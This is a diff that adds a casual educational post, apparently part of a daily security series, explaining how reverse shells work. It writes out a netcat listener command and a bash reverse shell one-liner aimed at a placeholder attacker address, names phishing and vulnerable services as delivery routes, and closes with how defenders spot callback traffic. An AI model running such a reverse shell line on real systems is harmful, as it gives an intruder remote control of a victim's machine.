@@ -1,0 +1,89 @@
+yesterday we covered how attackers gather intel before doing anything
+
+today they use it to get in
+
+and the trick they use is sneakier than you’d think
+
+and YES your challenge certainly is attached at the end! ;)
+
+you’ve might have heard of a shell before
+
+it’s just an interface for running commands on a system your Terminal, Command Prompt
+
+those are shells
+
+a reverse shell is the sneaky version
+
+normally if you want to connect to another computer, you initiate it: you → connect to → target
+
+BUT firewalls block random incoming connections
+
+so attackers flip it
+
+target → connects back to → attacker
+
+the attacker sets up a listener on their machine first
+
+then tricks the target into running code that calls home
+
+firewalls allow outgoing connections bec that’s normal traffic
+
+so the target reaches out, the attacker answers and now they have a shell on the victim’s machine from anywhere in the world
+
+what this looks like:
+
+STEP ONE:
+
+attacker sets up a listener on their machine: nc -lvnp 4444
+
+nc is netcat — a tool for making and receiving network connections
+
+-l means listen for incoming connections
+
+-v means verbose (show me what’s happening)
+
+-n means don’t do DNS lookups
+
+-p 4444 is the port to listen on
+
+the attacker is now ready to receive the connection from teh victim machine
+
+STEP TWO:
+
+then via the vulnerability the attacker discovers in recon, they trick the victim’s into running:
+
+bash -i >& /dev/tcp/attacker-ip/4444 0>&1
+
+bash -i opens an interactive shell
+
+/dev/tcp/attacker-ip/4444 is a special Linux file that represents a TCP connection to the attacker’s IP on port 4444
+
+>& ... 0>&1 redirects both input AND output through that connection
+
+so whatever the attacker types goes to the victim, and whatever the victim’s shell outputs comes back
+
+BOOM — the attacker now has a terminal on the victim’s system they can run commands, move files, create users, whatever they want
+
+how do they get the victim to run that code?
+
+this is where yesterday’s recon pays off
+
+    a phishing email with a malicious attachment
+
+    a vulnerable web app that executes uploaded files
+
+    a misconfigured service that runs arbitrary commands
+
+the reverse shell is the payload
+
+whatever vulnerability they found is the delivery
+
+defenders hunt for this by watching for unusual outbound connections
+
+especially to unknown IPs on weird ports
+
+that callback traffic is often exactly how reverse shells get caught
+
+TOMORROW ON CYBER BYTES: they’re in — now how do they make sure they STAY in?
+
+👀 STAY TUNED
